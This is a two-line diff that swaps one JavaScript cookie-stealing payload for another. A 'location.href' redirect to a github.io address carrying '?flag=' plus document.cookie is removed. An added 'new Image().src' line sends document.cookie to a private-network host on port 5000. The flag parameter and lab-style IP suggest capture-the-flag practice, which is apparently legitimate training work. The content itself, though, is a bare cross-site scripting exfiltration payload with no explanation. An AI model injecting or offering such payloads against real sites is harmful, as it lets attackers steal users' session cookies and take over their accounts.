@@ -1,1 +1,2 @@
-`location.href=”https://ahzero7d1.github.io/?flag="+document.cookie;
+new Image().src='http://192.168.56.1:5000?'+document.cookie
+
